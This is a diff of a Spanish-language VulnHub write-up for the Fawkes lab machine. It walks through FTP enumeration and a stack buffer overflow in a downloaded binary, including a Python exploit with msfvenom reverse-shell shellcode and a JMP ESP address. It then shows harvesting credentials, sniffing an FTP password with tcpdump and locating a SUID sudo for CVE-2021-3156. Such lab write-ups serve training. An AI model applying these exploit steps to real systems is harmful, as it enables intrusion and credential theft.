@@ -1,11 +1,11 @@
 ---
 layout: single
 title: Fawkes - VulnHub
-excerpt: "."
+excerpt: "Es una máquina algo complicada. Analizando los puertos activos, vemos uno en especial que resulta ser un servidor ejecutado por un binario que obtenemos del servicio FTP. Analizamos y hacemos pruebas de las funciones del binario, descubriendo que es vulnerable a Buffer Overflow, por lo que seguimos varios pasos para crear un script que, al ejecutarlo, obtenga una Reverse Shell de la máquina víctima. Dentro, descubrimos que se trata de un contenedor de Docker que está activo en el puerto 2222. Enumerando un poco, encontramos las credenciales de un usuario y una nota donde se nos indica que debemos analizar el tráfico de la red de la máquina. Haciendo lo pedido, obtenemos las credenciales de otro usuario, que nos permiten conectarnos al servicio SSH del puerto 22. Volviendo a enumerar, descubrimos el binario sudo con permisos SUID, pero al no hallar una forma de aprovecharnos de este, buscamos un Exploit para la versión de este binario y encontramos el CVE-2021-3156, que nos permite escalar privilegios para ser Root."
 date: 2024-11-17
 classes: wide
 header:
-  teaser: /assets/images/vulnhub-writeup-fawkes/_logo.png
+  teaser: /assets/images/vulnhub-writeup-fawkes/Fawkes3.jpg
   teaser_home_page: true
   icon: /assets/images/vulnhub.png
 categories:
@@ -14,14 +14,21 @@ categories:
 tags:
   - Linux
   - FTP
+  - SSH
   - MonkeyCom
+  - FTP Enumeration
   - Buffer Overflow
-  - 
-  - 
+  - Buffer Overflow (x32) Stack Based
+  - SSH Enumeration
+  - Abusing Sudoers Privilege
+  - Trafic Analysis
+  - Heap-Based Buffer Overflow in Sudo (CVE-2021-3156)
+  - Privesc - CVE-2021-3156
+  - OSCP Style
 ---
-![](/assets/images/vulnhub-writeup-/_logo.png)
+![](/assets/images/vulnhub-writeup-fawkes/Fawkes2.jpg)
 
-texto
+Es una máquina algo complicada. Analizando los puertos activos, vemos uno en especial que resulta ser un servidor ejecutado por un binario que obtenemos del **servicio FTP**. Analizamos y hacemos pruebas de las funciones del binario, descubriendo que es vulnerable a **Buffer Overflow**, por lo que seguimos varios pasos para crear un script que, al ejecutarlo, obtenga una **Reverse Shell** de la máquina víctima. Dentro, descubrimos que se trata de un contenedor de **Docker** que está activo en el **puerto 2222**. Enumerando un poco, encontramos las credenciales de un usuario y una nota donde se nos indica que debemos analizar el tráfico de la red de la máquina. Haciendo lo pedido, obtenemos las credenciales de otro usuario, que nos permiten conectarnos al **servicio SSH** del **puerto 22**. Volviendo a enumerar, descubrimos el binario sudo con **permisos SUID**, pero al no hallar una forma de aprovecharnos de este, buscamos un Exploit para la versión de este binario y encontramos el **CVE-2021-3156**, que nos permite escalar privilegios para ser **Root**.
 
 Herramientas utilizadas:
 * *ping*
@@ -31,13 +38,26 @@ Herramientas utilizadas:
 * *file*
 * *strings*
 * *strace*
-* **
-* **
-* **
-* **
-* **
-* **
-* **
+* *grep*
+* *chmod*
+* *nc*
+* *python3*
+* *gdb*
+* *pattern create*
+* *pattern offset*
+* *wc*
+* *msfvenom*
+* *nasm_shell*
+* *objdump*
+* *ssh*
+* *ifconfig*
+* *sudo*
+* *tcpdump*
+* *which*
+* *find*
+* *wget*
+* *scp*
+* *base64*
 
 
 <br>
@@ -65,15 +85,19 @@ Herramientas utilizadas:
 					<li><a href="#fuzzingBinario">Cuarto Paso: Aplicando Fuzzing al Binario</a></li>
 					<li><a href="#offset">Quinto Paso: Obteniendo el offset</a></li>
 					<li><a href="#identificacion">Sexto Paso: Identificando Ubicación de Representación de Caracteres</a></li>
-                                        <li><a href="#shellcodeExploit">Septimo Paso: Creación de Shellcode y Creación de Exploit</a></li>
+                                        <li><a href="#shellcodeExploit">Séptimo Paso: Creación de Shellcode y Creación de Exploit</a></li>
                                         <li><a href="#OpCode">Octavo Paso: Busqueda de OpCode para Aplicar un Salto (JMP) al ESP</a></li>
 					<li><a href="#NOPs">Noveno Paso: Aplicando NOPs en Exploit</a></li>
-                                        <li><a href="#Exploit">Decimo Paso: Prueba y Ejecución de Exploit</a></li>
+                                        <li><a href="#Exploit">Décimo Paso: Prueba y Ejecución de Exploit</a></li>
 				</ul>
 			</ul>
 		<li><a href="#Post">Post Explotación</a></li>
 			<ul>
-				<li><a href="#"></a></li>
+				<li><a href="#Enumeracion">Enumeración de la Máquina</a></li>
+				<ul>
+					<li><a href="#tcpdump">Analizando Tráfico de Red con tcpdump y Ganando Acceso como Usuario neville</a></li>
+				</ul>
+				<li><a href="#sudo">Escalando Privilegios con Binario SUID</a></li>
 			</ul>
 		<li><a href="#Links">Links de Investigación</a></li>
 	</ul>
@@ -151,7 +175,7 @@ Nmap done: 1 IP address (1 host up) scanned in 5.88 seconds
 | *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
 | *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |
 
-Veo varios puertos abiertos, pero se me hace curioso ver el **servicio FTP y 2 servicios SSH** (puerto 21 y puerto 2222). Además, nunca habia visto el puerto 9898 activo en otras máquinas.
+Veo varios puertos abiertos, pero se me hace curioso ver el **servicio FTP y 2 servicios SSH** (puerto 21 y puerto 2222). Además, nunca había visto el puerto 9898 en otras máquinas.
 
 <h2 id="Servicios">Escaneo de Servicios</h2>
 
@@ -263,7 +287,7 @@ Nmap done: 1 IP address (1 host up) scanned in 100.23 seconds
 
 Parece que para el **servicio FTP** tenemos activo el **usuario anonymous**, pero me intriga el resultado del puerto 9898, pues parecen comandos que puedes usar para comunicarte o para realizar una acción.
 
-Vamos a ir primero por lo web y luego al **servicio FTP**.
+Vamos a ir primero por la web y luego al **servicio FTP**.
 
 
 <br>
@@ -285,7 +309,7 @@ Entremos:
 
 Igual que en las máquinas anteriores, solamente una imagen.
 
-Veamos que nos dice **Wappalizer**:
+Veamos qué nos dice **Wappalizer**:
 
 <p align="center">
 <img src="/assets/images/vulnhub-writeup-fawkes/Captura2.png">
@@ -293,11 +317,11 @@ Veamos que nos dice **Wappalizer**:
 
 No mucho.
 
-Te diría que aplicaramos **Fuzzing** para ver que podemos encontrar, pero no encontraremos nada, así que vamos a entrar al **servicio FTP** para ver que encontramos.
+Te diría que aplicáramos **Fuzzing** para ver qué podemos encontrar, pero no encontraremos nada, así que vamos a entrar al **servicio FTP**.
 
 <h2 id="FTP">Enumerando de Servicio FTP</h2>
 
-Entremos usando el usuario anonymous:
+Entremos usando el **usuario anonymous**:
 ```batch
 ftp 192.168.1.007
 Connected to 192.168.1.007.
@@ -326,12 +350,12 @@ ftp> exit
 
 Encontramos únicamente un archivo y lo descargamos en nuestra máquina.
 
-Con el comando **file**, podemos ver que clase de archivo es:
+Con el comando **file**, podemos ver qué clase de archivo es:
 ```bash
 file server_hogwarts
 server_hogwarts: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, BuildID[sha1]=1d09ce1a9929b282f26770218b8d247716869bd0, for GNU/Linux 3.2.0, not stripped
 ```
-Parece ser un binario de **Linux** y tiene una arquitectura de 32 bits (x86).
+Parece ser un binario de **Linux** y tiene una arquitectura de **32 bits (x86)**.
 
 Si lo analizamos con el comando **strings**, veremos dentro de todo el resultado algunas funciones del **lenguaje C**.
 
@@ -387,9 +411,9 @@ listen(3, 3)                            = 0
 accept(3, ^C0xffdf4184, [16])             = ? ERESTARTSYS (To be restarted if SA_RESTART is set)
 strace: Process 27474 detached
 ```
-Parece que el binario ejecuta un proceso usando nuestra IP y el puerto 9898. Por lo que entiendo, el binario esta funcionando como un servidor, así que podemos conectarnos a este con **nc**.
+Parece que el binario ejecuta un proceso usando nuestra IP y el **puerto 9898**. Por lo que entiendo, el binario está funcionando como un servidor, así que podemos conectarnos a este con **netcat**.
 
-Recordando el escaneo, vimos que estaba usando el puerto 9898, así que posiblemente están usando este mismo binario.
+Recordando el escaneo, vimos que estaba usando el **puerto 9898**, así que posiblemente están usando esté mismo binario.
 
 Vamos a conectarnos a la máquina víctima en su puerto 9898 con **netcat**:
 ```bash
@@ -425,7 +449,7 @@ Pudimos ejecutar hechizos.
 
 Entonces, si usamos el binario y nos conectamos con **netcat** a nuestra propia IP, deberíamos ver lo mismo.
 
-Probemoslo:
+Probémoslo:
 * Terminal 1 - **Binario**:
 ```bash
 ./server_hogwarts
@@ -453,9 +477,9 @@ Enter your spell:
 
 Excelente, podemos hacer nuestras pruebas con el binario descargado.
 
-La primera que haremos, será usar un monton de A's para romper el funcionamiento del binario y ver que es lo que pasa.
+La primera que haremos, será usar un montón de **A's** para romper el funcionamiento del binario y ver qué es lo que pasa.
 
-Con el siguiente comando de **Python**, creamos 200 A's que vamos a usar:
+Con el siguiente comando de **Python**, creamos **200 A's** que vamos a usar:
 ```bash
 python3 -c 'print("A" * 200)'
 AAAAA...
@@ -486,15 +510,15 @@ Estos son los pasos que yo considero, son los que se deben aplicar para realizar
 * **Primero**: Identificar si un archivo encontrado es un binario.
 * **Segundo**: Estudiar y analizar su funcionamiento.
 * **Tercer**: Confirmar vulnerabilidad con herramienta **gdb**.
-* **Cuarto**: Aplicar Fuzzing para detectar limites del binario.
+* **Cuarto**: Aplicar Fuzzing para detectar límites del binario.
 * **Quinto**: Identificar el **offset**.
 * **Sexto**: Identificar en qué parte de la memoria se están representando los caracteres introducidos.
-* **Septimo**: Creación de Shellcode malicioso y creación de Exploit.
-* **Octavo**: Busqueda de **OpCode JMP ESP**.
+* **Séptimo**: Creación de Shellcode malicioso y creación de Exploit.
+* **Octavo**: Búsqueda de **OpCode JMP ESP**.
 * **Noveno**: Aplicación de NOPs y/o desplazamiento de pila.
-* **Decimo**: Prueba y ejecución de Exploit.
+* **Décimo**: Prueba y ejecución de Exploit.
 
-Aca te dejo unos links con buena información sobre **Buffer Overflow**:
+Acá te dejo unos links con buena información sobre **Buffer Overflow**:
 * <a href="https://keepcoding.io/blog/que-es-un-buffer-overflow/" target="_blank">¿Qué es un buffer overflow?</a>
 * <a href="https://www.fortinet.com/lat/resources/cyberglossary/buffer-overflow" target="_blank">Desbordamiento de búfer</a>
 * <a href="https://www.cloudflare.com/es-es/learning/security/threats/buffer-overflow/" target="_blank">¿Qué es el desbordamiento del búfer?</a>
@@ -505,7 +529,7 @@ Para este punto, ya hemos completado el punto 1 y 2, así que sigamos con los ot
 
 <h3 id="Confirmacion">Tercer Paso: Confirmando Buffer Overflow con gdb</h3>
 
-En mi caso, segui esta guia para instalar la herramienta **gdb**:
+En mi caso, seguí esta guía para instalar la herramienta **gdb**:
 <a href="https://www.gdbtutorial.com/tutorial/how-install-gdb" target="_blank">Guide to use GDB and learn debugging techniques: How to Install GDB?</a>
 
 Y le instale la siguiente expansión para mejorar la herramienta **gdb**:
@@ -516,7 +540,7 @@ Una vez que los tengas instalados, vamos a ejecutar **gdb** junto al binario:
 gdb -q ./server_hogwarts
 ```
 
-Hay muchos comandos que podemos usar dentro de **gdb** y aun más con la expansión que añadimos.
+Hay muchos comandos que podemos usar dentro de **gdb** y aún más con la expansión que añadimos.
 
 Por ejemplo, podemos analizar la seguridad del binario con `checksec`:
 ```bash
@@ -544,11 +568,11 @@ Ahora, vayamos al siguiente paso.
 
 <h3 id="fuzzingBinario">Cuarto Paso: Aplicando Fuzzing al Binario</h3>
 
-Esta parte es esencial para identificar los limites del binario o aplicación, introduciendo varias cantidades de caracteres hasta que falle.
+Esta parte es esencial para identificar los límites del binario o aplicación, introduciendo varias cantidades de caracteres hasta que falle.
 
 Esto ya lo hicimos, pero aquí te dejo un script de **Python** que puedes usar para introducir la cantidad de caracteres que quieras (este script puede servir para otros casos de **Buffer Overflow**, aunque depende de cada caso).
 
-El script lo llame **spiker.py**:
+El script lo llamé **spiker.py**:
 ```python
 #!/usr/bin/python3
 import socket
@@ -613,7 +637,7 @@ gef➤  r
 Starting program: ../Fawkes/content/server_hogwarts
 ```
 
-Como ya esta iniciado, vamos a enviar el mismo payload de **200 A's** y observamos la respuesta que nos de **gdb**:
+Como ya está iniciado, vamos a enviar el mismo payload de **200 A's** y observamos la respuesta que nos dé **gdb**:
 ```bash
 [ Legend: Modified register | Code | Heap | Stack | String ]
 ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
@@ -652,9 +676,9 @@ Con **200 A's** es suficiente para que el binario deje de funcionar, pero pueden
 
 Desde aquí, podemos identificar el **offset que es el número exacto de bytes que necesitas para sobrescribir el EIP**.
 
-Para esto, podemos generar un patron de distintos caracteres para que sea más facil identificar el **offset**.
+Para esto, podemos generar un patrón de distintos caracteres para que sea más fácil identificar el **offset**.
 
-Desde **gdb**, usamos el comando **pattern create** para que nos de 1024 caracteres que podamos usar: 
+Desde **gdb**, usamos el comando **pattern create** para que nos dé 1024 caracteres que podamos usar: 
 ```bash
 gef➤  pattern create
 [+] Generating a pattern of 1024 bytes (n=4)
@@ -692,21 +716,21 @@ $cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63
 [#0] Id 1, Name: "server_hogwarts", stopped 0x62616164 in ?? (), reason: SIGSEGV
 ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
 ```
-Observa el **EIP**, se pueden ver letras especificas que podemos identificar de todo el payload.
+Observa el **EIP**, se pueden ver letras específicas que podemos identificar de todo el payload.
 
 Lo podemos hacer manualmente de la siguiente manera:
 
-* Copia el payload y dentro de tu terminal, usalo dentro de **echo** y pipealo con **grep**, buscando las 4 letras que estan en el **EIP**:
+* Copia el payload y dentro de tu terminal, úsalo dentro de **echo** y con **grep** busca las 4 letras que están en el **EIP**:
 ```bash
 echo -n "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaa..." | grep "daab"
 ```
 
-* Ya identificado, copia hasta donde indico el comando anterior e igual usalo dentro de echo y pipealo con `wc -c`:
+* Ya identificado, copia hasta donde indicó el comando anterior e igual úsalo dentro de **echo** y usa `wc -c` para obtener la cantidad de letras:
 ```bash
 echo -n "aaaabaaacaaadaaaeaaafaa..." | wc -c
 116
 ```
-Si quitamos los 4 caracteres que buscamos, seria un total de 112 el **offset**.
+Si quitamos los 4 caracteres que buscamos, sería un total de **112 el offset**.
 
 También lo podemos hacer de forma sencilla con el comando `pattern offset $eip`:
 ```bash
@@ -720,7 +744,7 @@ Con eso, confirmamos la cantidad del **offset**.
 
 <h3 id="identificacion">Sexto Paso: Identificando Ubicación de Representación de Caracteres</h3>
 
-Estos registros son los que nos importan, pues son los registros de CPU hacia los cuales se pueden dirigir el **Buffer Overflow**:
+Estos registros son los que nos importan, pues son los registros de CPU hacia los cuales se puede dirigir el **Buffer Overflow**:
 * *EIP*: indica la siguiente dirección de memoria que el ordenador debería ejecutar.
 * *EAX*: almacena temporalmente cualquier dirección de retorno.
 * *EBX*: almacena datos y direcciones de memoria.
@@ -728,9 +752,9 @@ Estos registros son los que nos importan, pues son los registros de CPU hacia lo
 * *ESP*: se usa para referenciar el inicio de un hilo.
 * *EBP*: indica la dirección de memoria del final de un hilo.
 
-Más especificos, nos interesan estos dos: **EIṔ y EBP**.
+Más específicos, nos interesan estos dos: **EIP y EBP**.
 
-Podemos confirmar que después del **offset**, se reescribe el **EIP** y luego se escriben más caracteres. 
+Podemos confirmar que, después del **offset**, se reescribe el **EIP** y luego se escriben más caracteres. 
 
 Con **Python**, podemos generar varios caracteres para cumplir con el **offset**, sobreescribir el **EIP** y registrar n cantidad de caracteres después:
 ```bash
@@ -768,9 +792,9 @@ $cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63
 [#0] Id 1, Name: "server_hogwarts", stopped 0x42424242 in ?? (), reason: SIGSEGV
 ────────────────────────────────────────────────────────────────────────────────────────
 ```
-Excelente, observa que ahí estan las **4 B's** que creamos con el payload dentro del **EIP** y después quedan registradas las **C's**.
+Excelente, observa que ahí están las **4 B's** que creamos con el payload dentro del **EIP** y después quedan registradas las **C's**.
 
-Puedes ver que el **ESP** (el inicio de la pila) igual ya tiene las **C's**, lo que quiere decir que aquí es donde podemos meter el Shellcode.
+Puedes ver que el **ESP** (el inicio de la pila) igual ya tiene las **C's**, lo que quiere decir que aquí es donde podemos meter el **Shellcode**.
 
 Además, podemos inspeccionar el **ESP** desde **gdb** para comprobar lo del **ESP**:
 ```bash
@@ -785,17 +809,17 @@ gef➤  x/35wx $esp-5
 0xffffcc9b:     0x00000000      0x00000000      0x00000000      0x00000000
 0xffffccab:     0x6c655700      0x656d6f63      0x206f7420
 ```
-Con esto comprobamos que el **EIP** empieza con las **B's** y luego comienza el **ESP** que vale las **C's**
+Con esto comprobamos que el **EIP** empieza con las **B's** y luego comienza el **ESP** que vale las **C's**.
 
 <br>
 
-<h3 id="shellcodeExploit">Septimo Paso: Creación de Shellcode y Creación de Exploit</h3>
+<h3 id="shellcodeExploit">Séptimo Paso: Creación de Shellcode y Creación de Exploit</h3>
 
 Vamos muy bien, ahora podemos comenzar a crear nuestro Exploit en **Python**.
 
-Primero crearemos el Shellcode que será una **Reverse Shell** con **msfvenom**.
+Primero crearemos el **Shellcode** que será una **Reverse Shell** con **msfvenom**.
 
-Puedes crearlo para probarlo contra tu máquina o de una vez hacerlo para atacar el binario de la máquina víctima, pero en mi caso, lo hare para mi máquina:
+Puedes crearlo para probarlo contra tu máquina o de una vez hacerlo para atacar el binario de la máquina víctima, pero en mi caso, lo haré para mi máquina:
 ```bash
 msfvenom -p linux/x86/shell_reverse_tcp LHOST=Tu_IP LPORT=443 -b "\x00" -f py -v shellcode
 [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
@@ -814,9 +838,9 @@ shellcode += b"\xdb\...
 Le indicamos a **msfvenom** lo siguiente:
 * Crear una **Reverse Shell** para **arquitectura x86**.
 * Mi IP y un puerto al que será dirigido.
-* Que elimine el byte nulo (\x00), ya que puede darnos conflicto con el binario, pues esta hecho con **lenguaje C**.
+* Que elimine el **byte nulo (\x00)**, ya que puede darnos conflicto con el binario, pues esta hecho con **lenguaje C**.
 * Crear el formato del payload en **Python**
-* Especificamos el nombre de la variable que almacena el payload como **shellcode**.
+* Especificamos el nombre de la variable que almacena el payload como **Shellcode**.
 
 Ahora, empezamos a crear nuestro Exploit con **Python**, siendo muy similar al script **spiker.py**:
 ```python
@@ -839,13 +863,15 @@ shellcode += b"\xdb\xda\xbd\xba\xee\x62\x1...
 
 after_eip = shellcode
 
+payload = before_eip + eip + after_eip
+
 # Creando conexión y enviando shellcode
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect((ip_addr, port))
 s.send(payload)
 s.close()
 ```
-Así va quedando nuestro script, pero aun faltan cosas por completar en los siguientes pasos.
+Así va quedando nuestro script, pero aún faltan cosas por completar en los siguientes pasos.
 
 <br>
 
@@ -859,13 +885,13 @@ Así va quedando nuestro script, pero aun faltan cosas por completar en los sigu
 
 <br>
 
-Entonces, necesitamos buscar un **OpCode** donde se aplicara nuestro **Shellcode** para obtener la **Reverse Shell**.
+Entonces, necesitamos buscar un **OpCode** dentro del binario que nos ayude a escribir nuestro **Shellcode** para que se pueda ejecutar la **Reverse Shell**.
 
-Para esto, usamos el **EIP** para que apunte a una dirección de memoria donde se este aplique un **OpCode**, para que realice un salto (**JMP**) al **ESP**, que es donde queremos que se aplique el shellcode. Esto se le conoce como **JMP ESP**
+Para esto, usamos el **EIP** para que apunte a una dirección de memoria donde se aplique un **OpCode**, para que realice un salto (**JMP**) al **ESP**, que es donde queremos que se aplique el **Shellcode**. Esto se le conoce como **JMP ESP**
 
 Una herramienta que podemos ocupar es **nasm_shell** de **Metasploit Framework**.
 
-Podemos invocarla usando su ruta completa `/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb` y le indicamos que busque el `JMP ESP`:
+Podemos invocarla usando su ruta completa `/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb` y le indicamos que busque él `JMP ESP`:
 ```bash
 /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
 nasm > jmp ESP
@@ -886,12 +912,12 @@ objdump -D server_hogwarts| grep "ff e4"
 ```
 Se puede ocupar cualquiera que sea **JMP ESP**.
 
-Lo puedes agregar de una vez al Exploit, pero el **OpCode** debe ir en formato **Little Endian** que básicamente es ponerlo de atras hacia adelante de la siguiente forma:
+Lo puedes agregar de una vez al Exploit, pero el **OpCode** debe ir en formato **Little Endian** que básicamente es ponerlo de atrás hacia adelante de la siguiente forma:
 ```bash
 \x55\x9d\x04\x08 -> JMP ESP 8049d55
 ```
 
-Se agregaria en la variable **eip**:
+Se agregaría en la variable **eip**:
 ```python
 eip = b"\x55\x9d\x04\x08"  # OpCode JMP ESP 8049d55
 ```
@@ -924,9 +950,9 @@ Sigamos.
 
 <br>
 
-<h3 id="Exploit">Decimo Paso: Prueba y Ejecución de Exploit</h3>
+<h3 id="Exploit">Décimo Paso: Prueba y Ejecución de Exploit</h3>
 
-Con lo datos que ya hemos obtenido, nuestro Exploit debería quedar así:
+Con los datos que ya hemos obtenido, nuestro Exploit debería quedar así:
 ```python
 #!/usr/bin/python3
 
@@ -1019,10 +1045,312 @@ Con esto, hemos ejecutado un **Buffer Overflow** exitosamente.
 <br>
 
 
-<h2 id=""></h2>
+<h2 id="Enumeracion">Enumeración de la Máquina</h2>
 
+Ya dentro, te diría que obtengas una sesión interactiva, pero no vamos a poder hacerlo.
 
+Así que investiguemos qué nos podemos encontrar.
 
+Nos encontramos en la raíz, pero si vamos al directorio `/home`, encontraremos el directorio de harry y dentro estarán las credenciales de este usuario:
+```bash
+cd home
+ls
+harry
+cd harry
+ls -la
+total 60
+drwxr-sr-x    1 harry    harry         4096 Nov 17 21:45 .
+drwxr-xr-x    1 root     root          4096 Apr 13  2021 ..
+lrwxrwxrwx    1 root     harry            9 Apr 13  2021 .ash_history -> /dev/null
+-rw-r--r--    1 root     harry           24 Apr 13  2021 .mycreds.txt
+-rw-------    1 harry    harry       319488 Nov 17 21:45 core
+cat .mycreds.txt
+...
+```
+
+Podemos probar estas credenciales en el **servicio SSH** del **puerto 2222**:
+```bash
+ssh harry@192.168.1.007 -p 2222
+harry@192.168.1.007's password: 
+Welcome to Alpine!
+
+The Alpine Wiki contains a large amount of how-to guides and general
+information about administrating Alpine systems.
+See <http://wiki.alpinelinux.org/>.
+
+You can setup the system with the command: setup-alpine
+
+You may change this message by editing /etc/motd.
+
+2b1599256ca6:~$ whoami
+harry
+```
+Mucho mejor.
+
+Curiosamente, el **prompt** parece ser de un **contenedor Docker**, y lo podemos comprobar si nos vamos a la raíz y vemos todos los archivos:
+```bash
+2b1599256ca6:/$ ls -la
+total 72
+drwxr-xr-x    1 root     root          4096 Apr 24  2021 .
+drwxr-xr-x    1 root     root          4096 Apr 24  2021 ..
+-rwxr-xr-x    1 root     root             0 Apr 24  2021 .dockerenv
+drwxr-xr-x    2 root     root          4096 Mar 31  2021 bin
+drwxr-xr-x    5 root     root           340 Nov 19 19:31 dev
+...
+...
+...
+```
+
+Y también con **ifconfig**:
+```bash
+2b1599256ca6:~# ifconfig
+eth0      Link encap:Ethernet  HWaddr .....  
+          inet addr:172.17.0.2  Bcast:172.17.255.255  Mask:255.255.0.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:410 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:282 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+          RX bytes:40132 (39.1 KiB)  TX bytes:35218 (34.3 KiB)
+...
+...
+```
+Sigamos investigando.
+
+Veamos si tenemos algún privilegio:
+```bash
+2b1599256ca6:/$ sudo -l
+User harry may run the following commands on 2b1599256ca6:
+    (ALL) NOPASSWD: ALL
+```
+
+Entonces, podemos convertirnos en **Root**:
+```bash
+2b1599256ca6:/$ sudo su
+2b1599256ca6:/# whoami
+root
+```
+Bien.
+
+Vayamos al directorio del **Root**:
+```bash
+2b1599256ca6:/# cd root
+2b1599256ca6:~# ls
+horcrux1.txt  note.txt
+```
+
+Ya tenemos el primer horocrux:
+```bash
+horcrux_{NjogSGFSclkgUG90VGVyIGRFc1RyT3llZCBieSB2b2xEZU1vclQ=}
+```
+
+Leamos la nota:
+```bash
+2b1599256ca6:~# cat note.txt 
+Hello Admin!!
+
+We have found that someone is trying to login to our ftp server by mistake.You are requested to analyze the traffic and figure out the user.
+```
+Nos están pidiendo que analicemos el tráfico de la red para ver quién se está logueando vía **FTP**.
+
+<br>
+
+<h3 id="tcpdump">Analizando Tráfico de Red con tcpdump y Ganando Acceso como Usuario neville</h3>
+
+Primero, veamos si tenemos **tcpdump** en el contenedor:
+```bash
+2b1599256ca6:~# which tcpdump
+/usr/bin/tcpdump
+```
+Lo tenemos.
+
+Vamos a indicarle que analice el tráfico de la interfaz **eth0** de la máquina y aplicaremos un filtro para que solamente muestre paquetes de **FTP**.
+
+Hay varios filtros que se pueden usar, por ejemplo:
+* `port 21`
+* `port ftp`
+* `port ftp-data`
+
+Justo en **stackoverflow**, alguien tuvo esta duda:
+* <a href="https://stackoverflow.com/questions/46631666/how-i-can-to-capture-ftp-data-packets-via-tcpdump" target="_blank">How i can to capture FTP-data packets via tcpdump?</a>
+
+Apliquémoslo:
+```bash
+2b1599256ca6:~# tcpdump -i eth0 port ftp or ftp-data
+tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
+19:36:01.145511 IP 172.17.0.1.49520 > 2b1599256ca6.21: Flags [S], seq 2272672996, win 64240, options [mss 1460,sackOK,TS val 1020873716 ecr 0,nop,wscale 7], length 0
+19:36:01.145520 IP 2b1599256ca6.21 > 172.17.0.1.49520: Flags [S.], seq 2779183984, ack 2272672997, win 65160, options [mss 1460,sackOK,TS val 3164671643 ecr 1020873716,nop,wscale 7], length 0
+19:36:01.145533 IP 172.17.0.1.49520 > 2b1599256ca6.21: Flags [.], ack 1, win 502, options [nop,nop,TS val 1020873716 ecr 3164671643], length 0
+19:36:01.146036 IP 2b1599256ca6.21 > 172.17.0.1.49520: Flags [P.], seq 1:21, ack 1, win 510, options [nop,nop,TS val 3164671644 ecr 1020873716], length 20: FTP: 220 (vsFTPd 3.0.3)
+19:36:01.146068 IP 172.17.0.1.49520 > 2b1599256ca6.21: Flags [.], ack 21, win 502, options [nop,nop,TS val 1020873717 ecr 3164671644], length 0
+19:36:01.146119 IP 172.17.0.1.49520 > 2b1599256ca6.21: Flags [P.], seq 1:15, ack 21, win 502, options [nop,nop,TS val 1020873717 ecr 3164671644], length 14: FTP: USER neville
+19:36:01.146122 IP 2b1599256ca6.21 > 172.17.0.1.49520: Flags [.], ack 15, win 510, options [nop,nop,TS val 3164671644 ecr 1020873717], length 0
+19:36:01.146142 IP 2b1599256ca6.21 > 172.17.0.1.49520: Flags [P.], seq 21:55, ack 15, win 510, options [nop,nop,TS val 3164671644 ecr 1020873717], length 34: FTP: 331 Please specify the password.
+19:36:01.146164 IP 172.17.0.1.49520 > 2b1599256ca6.21: Flags [P.], seq 15:30, ack 55, win 502, options [nop,nop,TS val 1020873717 ecr 3164671644], length 15: FTP: PASS contraseña
+19:36:01.187838 IP 2b1599256ca6.21 > 172.17.0.1.49520: Flags [.], ack 30, win 510, options [nop,nop,TS val 3164671686 ecr 1020873717], length 0
+19:36:03.832622 IP 2b1599256ca6.21 > 172.17.0.1.49520: Flags [P.], seq 55:77, ack 30, win 510, options [nop,nop,TS val 3164674331 ecr 1020873717], length 22: FTP: 530 Login incorrect.
+19:36:03.832688 IP 172.17.0.1.49520 > 2b1599256ca6.21: Flags [P.], seq 30:36, ack 77, win 502, options [nop,nop,TS val 1020876404 ecr 3164674331], length 6: FTP: QUIT
+19:36:03.832694 IP 2b1599256ca6.21 > 172.17.0.1.49520: Flags [.], ack 36, win 510, options [nop,nop,TS val 3164674331 ecr 1020876404], length 0
+19:36:03.832714 IP 2b1599256ca6.21 > 172.17.0.1.49520: Flags [P.], seq 77:91, ack 36, win 510, options [nop,nop,TS val 3164674331 ecr 1020876404], length 14: FTP: 221 Goodbye.
+```
+Tardó alrededor de 1 minuto.
+
+Obtuvimos un usuario y contraseña que podemos probar en el **servicio SSH** del **puerto 22**:
+```bash
+ssh neville@192.168.1.007
+neville@192.168.1.007's password: 
+Linux Fawkes 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+neville@Fawkes:~$ whoami
+neville
+```
+
+Y aquí podemos encontrar el segundo horocrux:
+```bash
+neville@Fawkes:~$ cat horcrux2.txt 
+horcrux_{NzogTmFHaU5pIHRIZSBTbkFrZSBkZVN0cm9ZZWQgQnkgTmVWaWxsZSBMb25HYm9UVG9t}
+```
+
+<h2 id="sudo">Escalando Privilegios con Binario SUID</h2>
+
+Con este usuario, no tendremos privilegios de los que nos podamos aprovechar.
+
+Busquemos si existe un binario con **permisos SUID**:
+```bash
+neville@Fawkes:~$ find / -perm -4000 2>/dev/null
+/usr/local/bin/sudo
+/usr/bin/newgrp
+/usr/bin/chfn
+/usr/bin/mount
+/usr/bin/su
+/usr/bin/passwd
+/usr/bin/chsh
+/usr/bin/gpasswd
+/usr/bin/umount
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/eject/dmcrypt-get-device
+```
+Parece que tenemos el binario **sudo**.
+
+Veamos sus permisos:
+```bash
+neville@Fawkes:~$ ls -la /usr/local/bin
+total 1780
+drwxr-xr-x  2 root root    4096 Apr  7  2021 .
+drwxr-xr-x 11 root root    4096 Apr  7  2021 ..
+-rwsr-xr-x  1 root root  581632 Apr  7  2021 sudo
+```
